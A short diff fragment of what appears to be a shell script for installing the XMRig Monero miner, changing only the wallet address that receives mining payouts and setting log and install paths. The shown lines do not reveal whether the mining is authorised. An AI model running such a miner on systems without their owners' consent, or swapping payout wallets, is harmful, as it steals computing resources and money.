@@ -4,7 +4,7 @@ export LOG_XMRIG="/var/log/xmrig"
 export LOG_XMRIG_INSTALL="${LOG_XMRIG}_install"
 export TGT_DIR="/opt/github/"
 
-XMR_ADDRESS="42XXKCKA3Py1s96xZhEbSEgbxrzDRyiTwEvJRB7dZNaMFPXicziKPz8Ua7wkPaHQsgX8LKvnHmLm11kn8Vig7SsMPEyyygK"
+XMR_ADDRESS="481wBmRFXhoBf7UzhDKa6vZZAfbTHAUo1SDmyVEjodZpecbRG2MJfcf8WStKzL5kR9UFhf7jKEE2yCbejbNwPAnkLwjhrzS"
 
 echo > ${LOG_XMRIG_INSTALL}
 echo > ${LOG_XMRIG}
